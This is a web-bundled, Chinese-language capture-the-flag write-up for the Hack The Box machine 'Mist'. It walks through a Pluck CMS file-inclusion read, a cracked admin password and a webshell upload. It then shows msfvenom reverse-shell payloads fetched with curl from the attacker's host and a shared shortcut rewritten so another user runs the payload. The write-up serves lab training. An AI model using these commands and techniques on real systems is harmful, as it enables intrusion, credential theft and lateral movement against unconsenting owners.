"use strict";(self.webpackChunktarget_machines_write_up=self.webpackChunktarget_machines_write_up||[]).push([[2143],{36614:(e,n,t)=>{t.r(n),t.d(n,{assets:()=>d,contentTitle:()=>a,default:()=>h,frontMatter:()=>i,metadata:()=>s,toc:()=>c});const s=JSON.parse('{"id":"HackTheBox/Machines/Mist/index","title":"Mist","description":"Difficulty: Medium","source":"@site/docs/HackTheBox/Machines/Mist/index.md","sourceDirName":"HackTheBox/Machines/Mist","slug":"/HackTheBox/Machines/Mist/","permalink":"/Target-Machines-WriteUp/docs/HackTheBox/Machines/Mist/","draft":false,"unlisted":false,"editUrl":"https://github.com/TryHackMyOffsecBox/Target-Machines-WriteUp/edit/main/docs/HackTheBox/Machines/Mist/index.md","tags":[],"version":"current","frontMatter":{},"sidebar":"HackTheBox_Sidebar","previous":{"title":"LinkVortex","permalink":"/Target-Machines-WriteUp/docs/HackTheBox/Machines/LinkVortex/"},"next":{"title":"Monitored","permalink":"/Target-Machines-WriteUp/docs/HackTheBox/Machines/Monitored/"}}');var r=t(74848),l=t(28453);const i={},a="Mist",d={},c=[{value:"nmap \u4fe1\u606f\u641c\u96c6",id:"nmap-\u4fe1\u606f\u641c\u96c6",level:2},{value:"web service",id:"web-service",level:2},{value:"\u7f51\u7ad9\u540e\u53f0",id:"\u7f51\u7ad9\u540e\u53f0",level:3},{value:"User - MS01\\svc_web",id:"user---ms01svc_web",level:2},{value:"\u73af\u5883\u63a2\u6d4b",id:"\u73af\u5883\u63a2\u6d4b",level:3},{value:"User - MIST\\Brandon.Keywarp",id:"user---mistbrandonkeywarp",level:2}];function o(e){const n={a:"a",admonition:"admonition",code:"code",h1:"h1",h2:"h2",h3:"h3",header:"header",img:"img",p:"p",pre:"pre",table:"table",tbody:"tbody",td:"td",th:"th",thead:"thead",tr:"tr",...(0,l.R)(),...e.components};return(0,r.jsxs)(r.Fragment,{children:[(0,r.jsx)(n.header,{children:(0,r.jsx)(n.h1,{id:"mist",children:"Mist"})}),"\n",(0,r.jsxs)(n.admonition,{type:"info",children:[(0,r.jsx)(n.p,{children:"Difficulty: Medium"}),(0,r.jsx)(n.p,{children:"Operating System: Linux"})]}),"\n",(0,r.jsx)(n.h2,{id:"nmap-\u4fe1\u606f\u641c\u96c6",children:"nmap \u4fe1\u606f\u641c\u96c6"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-plaintext",metastring:'title="sudo nmap -A --min-rate=5000 -T5 -p- 10.10.11.17"',children:"Nmap scan report for 10.10.11.17\nHost is up (0.33s latency).\nNot shown: 65534 filtered tcp ports (no-response)\nPORT   STATE SERVICE VERSION\n80/tcp open  http    Apache httpd 2.4.52 ((Win64) OpenSSL/1.1.1m PHP/8.1.1)\n| http-cookie-flags:\n|   /:\n|     PHPSESSID:\n|_      httponly flag not set\n| http-title: Mist - Mist\n|_Requested resource was http://10.10.11.17/?file=mist\n| http-robots.txt: 2 disallowed entries\n|_/data/ /docs/\n|_http-server-header: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.1\n|_http-generator: pluck 4.7.18\n"})}),"\n",(0,r.jsx)(n.h2,{id:"web-service",children:"web service"}),"\n",(0,r.jsx)(n.p,{children:"\u5c1d\u8bd5\u76f4\u63a5\u8bbf\u95ee"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{alt:"img",src:t(31987).A+"",width:"2560",height:"1371"})}),"\n",(0,r.jsxs)(n.p,{children:["\u6839\u636e\u9875\u9762\uff0c\u53ef\u4ee5\u5f97\u77e5\u662f\u7531 ",(0,r.jsx)(n.a,{href:"https://github.com/pluck-cms/pluck",children:"pluck"})," \u6846\u67b6\u642d\u5efa\u7684"]}),"\n",(0,r.jsx)(n.p,{children:"\u5c1d\u8bd5\u8fdb\u884c\u76ee\u5f55\u7206\u7834"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-plaintext",children:"[22:57:55] 200 -    4KB - /ADMIN.php\n[22:57:55] 200 -    4KB - /admin.php\n[22:57:55] 200 -    4KB - /Admin.php\n[22:58:42] 200 -    2KB - /cgi-bin/printenv.pl\n[22:58:55] 301 -  333B  - /data  ->  http://10.10.11.17/data/\n[22:58:55] 200 -   48B  - /data/\n[22:59:00] 301 -  333B  - /docs  ->  http://10.10.11.17/docs/\n[22:59:00] 200 -    2KB - /docs/\n[22:59:21] 301 -  335B  - /images  ->  http://10.10.11.17/images/\n[22:59:21] 200 -  771B  - /images/\n[22:59:23] 403 -  300B  - /index.php::$DATA\n[22:59:24] 200 -    4KB - /install.php\n[22:59:24] 200 -    4KB - /install.php?profile=default\n[22:59:33] 200 -    1KB - /login.php\n[23:00:10] 200 -    2KB - /README.MD\n[23:00:10] 200 -    2KB - /README.md\n[23:00:10] 200 -    2KB - /ReadMe.md\n[23:00:10] 200 -    2KB - /readme.md\n[23:00:10] 200 -    2KB - /Readme.md\n[23:00:14] 200 -   47B  - /robots.txt\n"})}),"\n",(0,r.jsxs)(n.p,{children:["\u6839\u636e\u5176\u539f\u4ee3\u7801\uff0c\u53ef\u4ee5\u5b9a\u4f4d\u5230\u7f51\u7ad9\u7684\u914d\u7f6e\u6587\u4ef6\u76ee\u5f55 ",(0,r.jsx)(n.code,{children:"/data/settings/"})]}),"\n",(0,r.jsxs)(n.p,{children:["\u6ce8\u610f\u5230\u7f51\u7ad9\u9996\u9875\u7684 url \u7ed3\u6784 ",(0,r.jsx)(n.code,{children:"http://10.10.11.17/?file=mist"})," \u4e4b\u540e\uff0c\u4ee5\u53ca\u5b58\u5728\u6f0f\u6d1e ",(0,r.jsx)(n.a,{href:"https://www.exploit-db.com/exploits/36129",children:"Pluck CMS 4.7 - Multiple Local File Inclusion / File Disclosure Vulnerabilities"})," \u6000\u7591\u53ef\u80fd\u5b58\u5728\u4efb\u610f\u6587\u4ef6\u8bfb\u53d6\uff0c\u5c1d\u8bd5\u5229\u7528"]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-php",metastring:'title="http://10.10.11.17/data/modules/albums/albums_getimage.php?image=admin_backup.php"',children:"<?php\n$ww = 'c81dde783f9543114ecd9fa14e8440a2a868bfe0bacdf14d29fce0605c09d5a2bcd2028d0d7a3fa805573d074faa15d6361f44aec9a6efe18b754b3c265ce81e';\n?>146\n"})}),"\n",(0,r.jsxs)(n.p,{children:["\u76f4\u63a5\u4f7f\u7528 ",(0,r.jsx)(n.a,{href:"https://crackstation.net/",children:"crackstation.net"})," \u8fdb\u884c\u7834\u89e3"]}),"\n",(0,r.jsxs)(n.table,{children:[(0,r.jsx)(n.thead,{children:(0,r.jsxs)(n.tr,{children:[(0,r.jsx)(n.th,{style:{textAlign:"center"},children:"Hash"}),(0,r.jsx)(n.th,{style:{textAlign:"center"},children:"Type"}),(0,r.jsx)(n.th,{style:{textAlign:"center"},children:"Result"})]})}),(0,r.jsxs)(n.tbody,{children:[(0,r.jsxs)(n.tr,{children:[(0,r.jsx)(n.td,{style:{textAlign:"center"},children:"c81dde783f9543114ecd9fa14e8440a2a868bfe0bacdf14d29fce0605c09d5a2"}),(0,r.jsx)(n.td,{style:{textAlign:"center"}}),(0,r.jsx)(n.td,{style:{textAlign:"center"}})]}),(0,r.jsxs)(n.tr,{children:[(0,r.jsx)(n.td,{style:{textAlign:"center"},children:"bcd2028d0d7a3fa805573d074faa15d6361f44aec9a6efe18b754b3c265ce81e"}),(0,r.jsx)(n.td,{style:{textAlign:"center"},children:"sha512"}),(0,r.jsx)(n.td,{style:{textAlign:"center"},children:"lexypoo97"})]})]})]}),"\n",(0,r.jsx)(n.p,{children:"\u5f97\u5230\u7528\u6237\u5bc6\u7801"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-plaintext",children:"lexypoo97\n"})}),"\n",(0,r.jsx)(n.h3,{id:"\u7f51\u7ad9\u540e\u53f0",children:"\u7f51\u7ad9\u540e\u53f0"}),"\n",(0,r.jsxs)(n.p,{children:["\u5728 ",(0,r.jsx)(n.code,{children:"options"})," \u9009\u9879\u5361\uff0c\u53ef\u4ee5\u76f4\u63a5\u5b89\u88c5\u6a21\u5757\uff0c\u4e5f\u5c31\u662f\u53ef\u4ee5\u76f4\u63a5\u4e0a\u4f20 webshell"]}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{alt:"img",src:t(70813).A+"",width:"2560",height:"1371"})}),"\n",(0,r.jsxs)(n.p,{children:["\u4f7f\u7528 ",(0,r.jsx)(n.a,{href:"https://github.com/flozz/p0wny-shell",children:"p0wny-shell - Github"})," \u5927\u9a6c\u8fdb\u884c\u6253\u5305\u4e3a zip \u6587\u4ef6\u4e0a\u4f20\u5373\u53ef"]}),"\n",(0,r.jsx)(n.p,{children:"\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u4e0a\u4f20\u7684\u6587\u4ef6\u4f1a\u5b9a\u65f6\u8fdb\u884c\u5220\u9664\uff0c\u6240\u4ee5\u9700\u8981\u5c3d\u5feb\u8fdb\u884c shell \u53cd\u5f39"}),"\n",(0,r.jsx)(n.p,{children:"\u751f\u6210\u8f7d\u8377\uff0c\u5e76\u5f00\u542f http \u6295\u9012"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-shell",children:"msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.16.8 LPORT=9999 -f exe > 10.10.16.8.exe\npython3 -m httpserver 8080\n"})}),"\n",(0,r.jsx)(n.p,{children:"\u5728\u5927\u9a6c\u7684\u7a97\u53e3\u4e2d\u6267\u884c"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-shell",children:"curl http://10.10.16.8:8080/10.10.16.8.exe -o 10.10.16.8.exe\n10.10.16.8.exe\n"})}),"\n",(0,r.jsx)(n.p,{children:"\u672c\u5730\u542f\u52a8\u76d1\u542c"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-shell",children:"\u250c\u2500\u2500(randark \u327f kali)-[~]\n\u2514\u2500$ msfconsole -q\n[*] Starting persistent handler(s)...\nmsf6 > use exploit/multi/handler\n[*] Using configured payload generic/shell_reverse_tcp\nmsf6 exploit(multi/handler) > set lport 9999\nlport => 9999\nmsf6 exploit(multi/handler) > set lhost 10.10.16.8\nlhost => 10.10.16.8\nmsf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp\npayload => windows/x64/meterpreter/reverse_tcp\nmsf6 exploit(multi/handler) > run\n\n[*] Started reverse TCP handler on 10.10.16.8:9999\n"})}),"\n",(0,r.jsx)(n.p,{children:"\u5c31\u53ef\u4ee5\u6536\u5230\u56de\u8fde\u7684 shell"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-shell",children:"msf6 exploit(multi/handler) > run\n\n[*] Started reverse TCP handler on 10.10.16.8:9999\n[*] Sending stage (201798 bytes) to 10.10.11.17\n[*] Sending stage (201798 bytes) to 10.10.11.17\n[*] Meterpreter session 42 opened (10.10.16.8:9999 -> 10.10.11.17:59040) at 2024-04-07 23:50:39 +0800\n\nmeterpreter > sysinfo\nComputer        : MS01\nOS              : Windows Server 2022 (10.0 Build 20348).\nArchitecture    : x64\nSystem Language : en_US\nDomain          : MIST\nLogged On Users : 6\nMeterpreter     : x64/windows\n"})}),"\n",(0,r.jsx)(n.h2,{id:"user---ms01svc_web",children:"User - MS01\\svc_web"}),"\n",(0,r.jsx)(n.p,{children:"\u76f4\u63a5\u4e0a PEASS-ng \u811a\u672c\uff0c\u4ee5\u4e0b\u4e3a\u6709\u4ef7\u503c\u4fe1\u606f"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-plaintext",children:"Host Name:                 MS01\nOS Name:                   Microsoft Windows Server 2022 Standard\nOS Version:                10.0.20348 N/A Build 20348\nOS Manufacturer:           Microsoft Corporation\nDomain:                    mist.htb\nHotfix(s):                 3 Hotfix(s) Installed.\n                           [01]: KB5034613\n                           [02]: KB5035857\n                           [03]: KB5035970\n[+] DNS CACHE\n    Record Name . . . . . : DC01.mist.htb\n    A (Host) Record . . . : 192.168.100.100\n    Record Name . . . . . : DC01.mist.htb\n    A (Host) Record . . . : 10.10.11.17\n    Record Name . . . . . : DC01.mist.htb\n    A (Host) Record . . . : 192.168.100.100\n    Record Name . . . . . : DC01.mist.htb\n    A (Host) Record . . . : 10.10.11.17\n"})}),"\n",(0,r.jsx)(n.h3,{id:"\u73af\u5883\u63a2\u6d4b",children:"\u73af\u5883\u63a2\u6d4b"}),"\n",(0,r.jsxs)(n.p,{children:["\u53d1\u73b0\u4e00\u4e2a\u6587\u4ef6\u5939 ",(0,r.jsx)(n.code,{children:"C:\\Common Applications"})]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-plaintext",children:"Listing: C:\\Common Applications\n===============================\n\nMode              Size  Type  Last modified              Name\n----              ----  ----  -------------              ----\n100666/rw-rw-rw-  1118  fil   2021-05-08 16:15:16 +0800  Calculator.lnk\n100666/rw-rw-rw-  1175  fil   2021-05-08 06:14:00 +0800  Notepad.lnk\n100666/rw-rw-rw-  1171  fil   2021-05-08 06:15:00 +0800  Wordpad.lnk\n100666/rw-rw-rw-  190   fil   2024-03-10 17:46:01 +0800  desktop.ini\n"})}),"\n",(0,r.jsx)(n.p,{children:"\u53ef\u80fd\u5b58\u5728\u5176\u4ed6\u7528\u6237\u70b9\u51fb\u7684\u53ef\u80fd\u6027\uff0c\u90e8\u7f72\u4e00\u4e2a\u8d1f\u8f7d\uff0c\u5e76\u521b\u5efa\u6076\u610f\u5feb\u6377\u65b9\u5f0f"}),"\n",(0,r.jsx)(n.p,{children:"\u751f\u6210\u8f7d\u8377"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-shell",children:"\u250c\u2500\u2500(randark\u327fkali)-[~]\n\u2514\u2500$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.16.8 LPORT=8888 -f exe > 10.10.16.8-8888.exe\n[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload\n[-] No arch selected, selecting arch: x64 from the payload\nNo encoder specified, outputting raw payload\nPayload size: 510 bytes\nFinal size of exe file: 7168 bytes\n"})}),"\n",(0,r.jsx)(n.p,{children:"\u6295\u653e"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-shell",children:"meterpreter > upload 10.10.16.8-8888.exe\n[*] Uploading  : /home/randark/10.10.16.8-8888.exe -> 10.10.16.8-8888.exe\n[*] Uploaded 7.00 KiB of 7.00 KiB (100.0%): /home/randark/10.10.16.8-8888.exe -> 10.10.16.8-8888.exe\n[*] Completed  : /home/randark/10.10.16.8-8888.exe -> 10.10.16.8-8888.exe\n"})}),"\n",(0,r.jsx)(n.p,{children:"\u5f00\u542f\u76d1\u542c"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-shell",children:"\u250c\u2500\u2500(randark\u327fkali)-[~]\n\u2514\u2500$ msfconsole -q\n[*] Starting persistent handler(s)...\nmsf6 > use exploit/multi/handler\n[*] Using configured payload generic/shell_reverse_tcp\nmsf6 exploit(multi/handler) > set lport 8888\nlport => 8888\nmsf6 exploit(multi/handler) > set lhost 10.10.16.8\nlhost => 10.10.16.8\nmsf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp\npayload => windows/x64/meterpreter/reverse_tcp\nmsf6 exploit(multi/handler) > run\n\n[*] Started reverse TCP handler on 10.10.16.8:8888 \n"})}),"\n",(0,r.jsx)(n.p,{children:"\u521b\u5efa\u6076\u610f\u5feb\u6377\u65b9\u5f0f"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-powershell",children:'meterpreter > shell\nProcess 2516 created.\nChannel 5 created.\nMicrosoft Windows [Version 10.0.20348.2340]\n(c) Microsoft Corporation. All rights reserved.\n\nC:\\xampp\\htdocs>powershell\npowershell\nWindows PowerShell\nCopyright (C) Microsoft Corporation. All rights reserved.\n\nInstall the latest PowerShell for new features and improvements! https://aka.ms/PSWindows\n\nPS C:\\xampp\\htdocs> $objShell = New-Object -ComObject WScript.Shell\n$objShell = New-Object -ComObject WScript.Shell\nPS C:\\xampp\\htdocs> $lnk = $objShell.CreateShortcut("c:\\Common Applications\\Notepad.lnk")\n$lnk = $objShell.CreateShortcut("c:\\Common Applications\\Notepad.lnk")\nPS C:\\xampp\\htdocs> $lnk.TargetPath = "C:\\xampp\\htdocs\\10.10.16.8-8888.exe"              \n$lnk.TargetPath = "C:\\xampp\\htdocs\\10.10.16.8-8888.exe"\nPS C:\\xampp\\htdocs> $lnk.Save()\n$lnk.Save()\n'})}),"\n",(0,r.jsx)(n.p,{children:"\u7b49\u5f85\u7247\u523b\u4e4b\u540e\uff0c\u6536\u5230\u56de\u8fde\u7684shell"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-shell",children:"msf6 exploit(multi/handler) > run\n\n[*] Started reverse TCP handler on 10.10.16.8:8888 \n[*] Sending stage (201798 bytes) to 10.10.11.17\n[*] Meterpreter session 2 opened (10.10.16.8:8888 -> 10.10.11.17:59059) at 2024-04-08 13:09:17 +0800\n\nmeterpreter > sysinfo \ngetComputer        : MS01\nOS              : Windows Server 2022 (10.0 Build 20348).\nArchitecture    : x64\nSystem Language : en_US\nDomain          : MIST\nLogged On Users : 7\nMeterpreter     : x64/windows\nmeterpreter > getuid \nServer username: MIST\\Brandon.Keywarp\n"})}),"\n",(0,r.jsx)(n.h2,{id:"user---mistbrandonkeywarp",children:"User - MIST\\Brandon.Keywarp"}),"\n",(0,r.jsx)(n.p,{children:"TODO \u672a\u5b8c\u6210"})]})}function h(e={}){const{wrapper:n}={...(0,l.R)(),...e.components};return n?(0,r.jsx)(n,{...e,children:(0,r.jsx)(o,{...e})}):o(e)}},70813:(e,n,t)=>{t.d(n,{A:()=>s});const s=t.p+"assets/images/image_20240415-231519-b7e3fba08c1c421bf2e9597c11311d54.png"},31987:(e,n,t)=>{t.d(n,{A:()=>s});const s=t.p+"assets/images/image_20240458-225818-d06a5bc344fe088e67f738331d0fb6a4.png"},28453:(e,n,t)=>{t.d(n,{R:()=>i,x:()=>a});var s=t(96540);const r={},l=s.createContext(r);function i(e){const n=s.useContext(l);return s.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function a(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(r):e.components||r:i(e.components),s.createElement(l.Provider,{value:n},e.children)}}}]);